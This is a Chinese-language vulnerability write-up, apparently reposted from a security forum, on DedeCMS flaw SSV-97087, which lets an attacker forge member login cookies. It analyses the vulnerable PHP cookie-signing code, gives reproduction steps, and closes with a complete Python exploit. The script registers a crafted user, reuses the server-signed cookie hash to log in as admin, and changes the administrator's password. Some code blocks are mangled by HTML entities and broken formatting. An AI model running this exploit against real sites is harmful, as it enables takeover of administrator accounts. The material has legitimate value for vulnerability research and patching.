# 【开启会员注册】（SSV-97087）DeDecms 任意用户登录

> 原文：[https://www.zhihuifly.com/t/topic/2864](https://www.zhihuifly.com/t/topic/2864)

# （SSV-97087）DeDecms 任意用户登录

## 一、漏洞简介

漏洞编号：SSV-97087，提交时间：20180118

dedecms的会员模块的身份认证使用的是客户端session，在Cookie中写入用户ID并且附上ID__ckMd5，用做签名。主页存在逻辑漏洞，导致可以返回指定uid的ID的Md5散列值。原理上可以伪造任意用户登录。

## 二、漏洞影响

## 三、复现过程

### 代码分析

在/member/index.php中会接收uid和action参数。uid为用户名，进入index.php后会验证Cookie中的用户ID与uid(用户名)并确定用户权限。

```
if($action == '')
   {
       include_once(DEDEINC."/channelunit.func.php");
       $dpl = new DedeTemplate();
       $tplfile = DEDEMEMBER."/space/{$_vars['spacestyle']}/index.htm";

```
 //更新最近访客记录及站点统计记录
   $vtime = time();
   $last_vtime = GetCookie('last_vtime');
   $last_vid = GetCookie('last_vid');
   if(empty($last_vtime))
   {
       $last_vtime = 0;
   }
   if($vtime - $last_vtime &gt; 3600 || !preg_match('#,'.$uid.',#i', ','.$last_vid.','))
   {
       if($last_vid!='')
       {
           $last_vids = explode(',',$last_vid);
           $i = 0;
           $last_vid = $uid;
           foreach($last_vids as $lsid)
           {
               if($i&gt;10)
               {
                   break;
               }
               else if($lsid != $uid)
               {
                   $i++;
                   $last_vid .= ','.$last_vid;
               }
           }
       }
       else
       {
           $last_vid = $uid;
       }
       PutCookie('last_vtime', $vtime, 3600*24, '/');
       PutCookie('last_vid', $last_vid, 3600*24, '/'); 
``` 
```

我们可以看到当uid存在值时就会进入我们现在的代码中，当cookie中的last_vid中不存在值为空时，就会将uid值赋予过去，$last_vid = $uid;，然后PutCookie。

那么这么说，我们控制了$uid就相当于可以返回任意值经过服务器处理的md5值。

而在接下来会验证用户是否登录。

现在我们来看看，dedecms会员认证系统是怎么实现的：/include/memberlogin.class.php

```
//php5构造函数
function __construct($kptime = -1, $cache=FALSE)
{
    global $dsql;
    if($kptime==-1){
        $this->M_KeepTime = 3600 * 24 * 7;
    }else{
        $this->M_KeepTime = $kptime;
    }
    $formcache = FALSE;
    $this->M_ID = $this->GetNum(GetCookie("DedeUserID"));
    $this->M_LoginTime = GetCookie("DedeLoginTime");
    $this->fields = array();
    $this->isAdmin = FALSE;
    if(empty($this->M_ID))
    {
        $this->ResetUser();
    }else{
        $this->M_ID = intval($this->M_ID);

```
 if ($cache)
    {
        $this-&gt;fields = GetCache($this-&gt;memberCache, $this-&gt;M_ID);
        if( empty($this-&gt;fields) )
        {
            $this-&gt;fields = $dsql-&gt;GetOne("Select * From `#@__member` where mid='{$this-&gt;M_ID}' ");
        } else {
            $formcache = TRUE;
        }
    } else {
        $this-&gt;fields = $dsql-&gt;GetOne("Select * From `#@__member` where mid='{$this-&gt;M_ID}' ");
    }

    if(is_array($this-&gt;fields)){
        #api{{
        if(defined('UC_API') &amp;&amp; @include_once DEDEROOT.'/uc_client/client.php')
        {
            if($data = uc_get_user($this-&gt;fields['userid']))
            {
                if(uc_check_avatar($data[0]) &amp;&amp; !strstr($this-&gt;fields['face'],UC_API))
                {
                    $this-&gt;fields['face'] = UC_API.'/avatar.php?uid='.$data[0].'&amp;size=middle';
                    $dsql-&gt;ExecuteNoneQuery("UPDATE `#@__member` SET `face`='".$this-&gt;fields['face']."' WHERE `mid`='{$this-&gt;M_ID}'");
                }
            }
        }
        #/aip}}

        //间隔一小时更新一次用户登录时间
        if(time() - $this-&gt;M_LoginTime &gt; 3600)
        {
            $dsql-&gt;ExecuteNoneQuery("update `#@__member` set logintime='".time()."',loginip='".GetIP()."' where mid='".$this-&gt;fields['mid']."';");
            PutCookie("DedeLoginTime",time(),$this-&gt;M_KeepTime);
        }
        $this-&gt;M_LoginID = $this-&gt;fields['userid'];
        $this-&gt;M_MbType = $this-&gt;fields['mtype'];
        $this-&gt;M_Money = $this-&gt;fields['money'];
        $this-&gt;M_UserName = FormatUsername($this-&gt;fields['uname']);
        $this-&gt;M_Scores = $this-&gt;fields['scores'];
        $this-&gt;M_Face = $this-&gt;fields['face'];
        $this-&gt;M_Rank = $this-&gt;fields['rank'];
        $this-&gt;M_Spacesta = $this-&gt;fields['spacesta'];
        $sql = "Select titles From #@__scores where integral&lt;={$this-&gt;fields['scores']} order by integral desc";
        $scrow = $dsql-&gt;GetOne($sql);
        $this-&gt;fields['honor'] = $scrow['titles'];
        $this-&gt;M_Honor = $this-&gt;fields['honor'];
        if($this-&gt;fields['matt']==10) $this-&gt;isAdmin = TRUE;
        $this-&gt;M_UpTime = $this-&gt;fields['uptime'];
        $this-&gt;M_ExpTime = $this-&gt;fields['exptime'];
        $this-&gt;M_JoinTime = MyDate('Y-m-d',$this-&gt;fields['jointime']);
        if($this-&gt;M_Rank&gt;10 &amp;&amp; $this-&gt;M_UpTime&gt;0){
            $this-&gt;M_HasDay = $this-&gt;Judgemember();
        }
        if( !$formcache )
        {
            SetCache($this-&gt;memberCache, $this-&gt;M_ID, $this-&gt;fields, 1800);
        }
    }else{
        $this-&gt;ResetUser();
    }
} 
``` `}` 
```

$this->M_ID等于Cookie中的DedUserID，我们继续看看GetCookie函数

```
if ( ! function_exists('GetCookie'))
{
    function GetCookie($key)
    {
        global $cfg_cookie_encode;
        if( !isset($_COOKIE[$key]) || !isset($_COOKIE[$key.'__ckMd5']) )
        {
            return '';
        }
        else
        {
            if($_COOKIE[$key.'__ckMd5']!=substr(md5($cfg_cookie_encode.$_COOKIE[$key]),0,16))
            {
                return '';
            }
            else
            {
                return $_COOKIE[$key];
            }
        }
    }
} 
```

它不但读了cookie还验证了md5值。

这样，由于index.php中我们可以控制返回一个输入值和这个输入值经过服务器处理后的md5值。那么如果我们伪造DedUserID和它对应的MD5就行了。

最后一个问题，因为我们上面是通过用户名伪造ID的，用户名为字符串而ID为整数，但好在在构造用户类中将M_ID intval了一下$this->M_ID = intval($this->M_ID); 那么这么说，如果我们想伪造ID为1的用户的Md5，我们只要在上面设置uid(用户名)为’000001’即可。

### 复现

#### 1、先从member/index.php中获取伪造的DedeUserID和它对于的md5

#### 2、使用它登录

访问member/index.php?uid=0000001并抓包(注意cookie中last_vid值应该为空)。

![image](img/174a19a01cabcaa406db3d8af8ab2ed8.png)

可以看到已经获取到了，拿去当做DeDeUserID

![image](img/3a9f38dc9ee805cbe908bc8e1d8adfec.png)

可以看到，登陆了admin用户。

### python脚本

```
 # coding=utf-8

import requests

import re

if **name** == “**main**”:

dede_host = “[http://127.0.0.1/](http://127.0.0.1/)”

oldpwd = ‘123456’

newpwd = “cnvdcnvd”

s = requests.Session()

```
if '系统关闭了会员功能' in requests.get(dede_host + 'member/reg_new.php').content:
    exit('The system has closed the member function .Can not attack !!!')
else:
    print "The system opened the membership function, I wish you good luck  !!"

headers = {"Referer": dede_host + "member/reg_new.php"}
rs = s.get(dede_host + 'include/vdimgck.php').content
file = open('1.jpg', "wb")
file.write(rs)
file.close()

vdcode = raw_input("Please enter the registration verification code : ")

userid = '0000001'
uname = '0000001'
userpwd = '123456'

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0)",
           "Content-Type": "application/x-www-form-urlencoded"}
data = "dopost=regbase&amp;step=1&amp;mtype=%E4%B8%AA%E4%BA%BA&amp;mtype=%E4%B8%AA%E4%BA%BA&amp;userid={userid}&amp;uname={uname}&amp;userpwd={userpwd}&amp;userpwdok={userpwd}&amp;email=0000001%400000001.com&amp;safequestion=0&amp;safeanswer=&amp;sex=%E7%94%B7&amp;vdcode={vdcode}&amp;agree=".format(
    userid=userid, uname=uname, userpwd=userpwd, vdcode=vdcode)
rs = s.post(dede_host + '/member/reg_new.php', data=data, headers=headers)
if "验证码错误" in rs.content:
    exit("Verification code error, account registration failed")
elif '注册成功' in rs.content:
    print 'registration success !!'

rs = s.get(dede_host + "/member/index.php?uid={userid}".format(userid=userid))
if "资料尚未通过审核" in rs.content:
    exit("User information has not been approved !!!")  # 会员使用权限开通状态(-10 邮件验证 -1 手工审核, 0 没限制)：
searchObj = re.search(r'last_vid__ckMd5=(.*?);', rs.headers['Set-Cookie'], re.M | re.I)
last_vid__ckMd5 = searchObj.group(1)
s.cookies['DedeUserID'] = userid
s.cookies['DedeUserID__ckMd5'] = last_vid__ckMd5
rs = s.get(dede_host + "/member/index.php")
if "class=\"userName\"&gt;admin&lt;/a&gt;" in rs.text:
    print "Administrator login successful !!"

headers = {"Referer": dede_host + "member/edit_baseinfo.php"}
rs = s.get(dede_host + 'include/vdimgck.php').content
file = open('2.jpg', "wb")
file.write(rs)
file.close()

vdcode = raw_input("Please enter the verification code : ")

data = {"dopost": "save", "uname": "admin", "oldpwd": oldpwd, "userpwd": newpwd, "userpwdok": newpwd,
        "safequestion": "0", "newsafequestion": "0", "sex": "男", "email": "admin@admin.com", "vdcode": vdcode}
rs = s.post(dede_host + '/member/edit_baseinfo.php', data=data)
if "成功更新你的基本资料" in  rs.content:
   print "Administrator password modified successfully !!"
   print "The new administrator password is : " + newpwd
else:
    print "attack fail" 
``` 
```